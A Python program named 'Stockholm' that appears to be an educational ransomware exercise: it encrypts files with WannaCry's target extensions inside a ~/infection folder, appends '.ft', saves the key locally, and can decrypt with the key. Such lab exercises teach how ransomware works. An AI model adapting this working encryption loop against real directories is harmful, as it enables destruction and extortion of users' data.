from cryptography.fernet import Fernet
import argparse
import os
from pathlib import Path
import sys

VERSION = "1.0.0"

WANNACRY_EXTENSIONS = {
    '.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai',
    '.asp', '.aspx', '.avhd', '.back', '.bak', '.bmp', '.brd', '.bz2', '.cgm', '.class',
    '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip',
    '.djvu', '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb',
    '.eml', '.fdb', '.fla', '.flv', '.frm', '.gif', '.gpg', '.gz', '.hwp', '.ibd', '.iso',
    '.jar', '.java', '.jpeg', '.jpg', '.js', '.jsp', '.key', '.lay', '.lay6', '.ldf', '.m3u',
    '.m4u', '.max', '.mdb', '.mdf', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods',
    '.odt', '.onepkg', '.ost', '.otg', '.otp', '.ots', '.ott', '.p12', '.pas', '.pdf', '.pem',
    '.pfx', '.php', '.pl', '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx',
    '.ppt', '.pptm', '.pptx', '.ps1', '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch',
    '.sh', '.sldm', '.sldx', '.sln', '.snt', '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std',
    '.sti', '.stw', '.suo', '.svg', '.swf', '.sxc', '.sxd', '.sxi', '.sxm', '.sxw', '.tar',
    '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd', '.vdi',
    '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv',
    '.xlc', '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw',
    '.xml', '.zip'
}

def parse_args():
    parser = argparse.ArgumentParser(prog="Stockholm",
                                        usage='%(prog)s [-h] [-v] [-r KEY] [-s]',
                                        description="Program that affect a small portion of your local files")
    parser.add_argument("-v","--version", action="version", version=f"Stockholm {VERSION}", help="show the version of the program")
    parser.add_argument("-r","--reverse", metavar="KEY", help="Decrypt files with key" )
    parser.add_argument("-s","--silent", action="store_true", help="Run in silent mode")
    args = parser.parse_args()
    return args

def generate_key():
    key = Fernet.generate_key()
    key_string = key.decode()

    key_file = Path.home() / '.stockholm_key'
    key_file.write_text(key_string)

    return key_string

def encrypt_file(file, key, silent):
    try:
        fernet = Fernet(key.encode())

        with open(file, 'rb') as f:
            file_data = f.read()
        
        encrypted_data = fernet.encrypt(file_data)

        with open(file, 'wb') as f:
            f.write(encrypted_data)

        new_path = file.with_suffix(file.suffix + '.ft')
        file.rename(new_path)

        if not silent:
                print(f"Encrypted: {new_path.name}")

    except Exception as e :
        print(f"Error encrypting {file}: {e}", file=sys.stderr)

def decrypt_file(file,key,silent):
    try:
        fernet = Fernet(key.encode())

        with open(file, 'rb') as f:
            encrypted_data = f.read()
        
        decrypted_data = fernet.decrypt(encrypted_data)

        with open(file, 'wb') as f:
            f.write(decrypted_data)

        original_path = file.with_suffix('')
        file.rename(original_path)

        if not silent:
            print(f"Decrypted: {original_path.name}")

    except Exception as e:
        print(f"Error decrypting {file}: {e}", file=sys.stderr)

def main():
    args = parse_args()
    home = Path.home()
    infection_dir = Path.home() / 'infection'
    if not infection_dir.exists():
        print("Error: infection directory does not exist", file=sys.stderr)
        sys.exit(1)

    if args.reverse:
        key = args.reverse
        for file in infection_dir.iterdir():
            if file.is_file() and file.suffix == '.ft':
                decrypt_file(file, key, args.silent)
    else:
        key = generate_key()
        if not args.silent:
            print(f"Encryption key: {key}")

        for file in infection_dir.iterdir():
            if file.is_file() and file.suffix in WANNACRY_EXTENSIONS:
                encrypt_file(file, key, args.silent)
        

if __name__ == '__main__':
   main()